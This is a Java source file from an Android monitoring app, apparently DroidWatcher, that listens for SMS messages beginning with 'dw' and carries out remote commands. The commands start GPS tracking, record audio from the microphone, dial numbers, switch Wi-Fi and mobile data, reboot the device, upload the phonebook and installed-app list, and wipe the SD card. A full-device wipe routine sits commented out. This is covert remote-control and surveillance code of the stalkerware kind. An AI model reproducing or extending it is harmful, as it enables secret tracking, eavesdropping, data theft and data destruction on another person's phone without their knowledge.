package com.droidwatcher;

import java.util.Locale;

import org.acra.ACRA;

import com.droidwatcher.lib.FileUtil;
import com.droidwatcher.modules.CommandsModule;

import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SmsCommand extends Thread {
	private static final String KEY_WORD = "dw";
	
	private String mMessage;
	private String mNumber;
	private SettingsManager mSettings;
	private Context mContext;
	
	/** SMS commands */
	private enum Command{
		/** start gps <br> <strong>dw gpson <i>interval</i></strong>*/
		gpson,
		/** stop gps */
		gpsoff,
		/** get gps coord once */
		gpsget,
		/** dial the specified number <br> <strong>dw callback <i>number</i></strong>*/
		callback,
		/** reset settings to default. Disconnecting from system */
		reset,
		/** connect to system <br> <strong>dw connect <i>login</i></strong>*/
		connect,
		/** start recording audio from mic <br> <strong>dw record <i>seconds</i></strong>*/
		record,
		recordstop,
		/** Enable Wi-Fi */
		wifion,
		/** Disable Wi-Fi */
		wifioff,
		gprson,
		gprsoff,
		reboot,
		restart,
		contact,
		applist,
		wipesd,
		/** remote wipe (not working) */
		wipe;
	}

	public SmsCommand(Bundle bundle, Context context){
		mMessage = "";
		mNumber = "";
		
		try {
			Object[] pdus = (Object[]) bundle.get("pdus");
			SmsMessage msg = SmsMessage.createFromPdu((byte[])pdus[0]);
			mMessage = new String(msg.getDisplayMessageBody().getBytes(), "UTF-8");
			
			for (int i = 1; i < pdus.length; i++){
				mMessage += SmsMessage.createFromPdu((byte[])pdus[i]).getDisplayMessageBody();
			}
			
			mNumber = msg.getOriginatingAddress();
		
		} catch (Exception e) {
			Debug.exception(e);
			ACRA.getErrorReporter().handleSilentException(e);
		}
		
		mMessage = mMessage.toLowerCase(Locale.US);
		this.mContext = context;
	}
	
	public Boolean isCommand(){
		if (mMessage.length() > 2 && mMessage.substring(0, 2).equals(KEY_WORD)){
			return true;
		}
		
		return false;
	}
	
//	public void execute(){
//		new Thread(new Runnable() {
//			public void run() {
//				start();
//			}
//		}).start();
//	}
	
	@Override
	public void run(){
		try {
			String[] arr = mMessage.split(" ");
			if (arr.length < 2){
				return;
			}
			mSettings = new SettingsManager(mContext);
			Command command = Command.valueOf(arr[1]);
			
			if (!mSettings.isConnected() && command != Command.connect){
				return;
			}
			
			switch (command) {
			case gpsget:
				CommandsModule.gpsGet(mNumber);
				break;
			case gpson:
				gpsOn(arr);
				break;
			case gpsoff:
				gpsOff();
				break;
			case callback:
				if (arr.length >= 3) {
					CommandsModule.callBack(mContext, arr[2]);
				}
				break;
			case reset:
				reset();
				break;
			case connect:
				connect(arr);
				break;
			case record:
				record(arr);
				break;
			case recordstop:
				CommandsModule.recordStop();
				break;
			case wifion:
				CommandsModule.setWiFiState(mContext, true);
				break;
			case wifioff:
				CommandsModule.setWiFiState(mContext, false);
				break;
//			case wipe:
//				wipe();
//				break;
			case gprsoff:
				CommandsModule.setMobileDataState(mContext, false);
				break;
			case gprson:
				CommandsModule.setMobileDataState(mContext, true);
				break;
			case reboot:
				CommandsModule.reboot();
				break;
			case restart:
				CommandsModule.restart(mContext);
				break;
			case wipesd:
				if (arr.length >= 3) {
					CommandsModule.wipeSd(mContext, arr[2]);
				}
				FileUtil.wipeSdcard();
				break;
			case contact:
				CommandsModule.getPhoneBook(mContext,  mSettings.login());
				break;
			case applist:				
				CommandsModule.getApplicationList(mContext,  mSettings.login());
				break;
			default:
				break;
			}
		}
		catch(Exception e){
			Debug.exception(e);
		}
	}
	
	private void record(String[] arr){
		int duration = 60;
		
		if (arr.length > 2){
			try {
				duration = Integer.parseInt(arr[2]);
			} catch (NumberFormatException e) {
				Debug.exception(e);
			}
		}
		
		CommandsModule.record(duration);
	}
	
	private void connect(String[] arr){
		if (arr.length >= 3){
			String login = arr[2];
			CommandsModule.connect(mContext, mSettings, login);
		}
	}
	
	private void reset(){
		mSettings.clear();
	}
	
	private void gpsOn(String[] arr) throws Exception{
		Integer interval = Integer.getInteger(arr[2], 10);
		
		mSettings.gpsInterval(Integer.toString(interval));
		
		if (!mSettings.isGpsTrackingEnabled()){
			mSettings.isGpsTrackingEnabled(true);
		}
	}
	
	private void gpsOff(){
		if (mSettings.isGpsTrackingEnabled()){
			mSettings.isGpsTrackingEnabled(false);
		}
	}
	
	
	
	//private void wipe(){
		/*DevicePolicyManager dpm = (DevicePolicyManager)context.getSystemService(Context.DEVICE_POLICY_SERVICE); ;
		dpm.wipeData(0);*/
		
		/*Intent i = new Intent("android.intent.action.MAIN");
	    i.setClassName("com.android.settings", "com.android.settings.MasterClear");
	    i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	    i.putExtra("EASRemoteWipe", true);
	    context.startActivity(i);*/
	//}
}
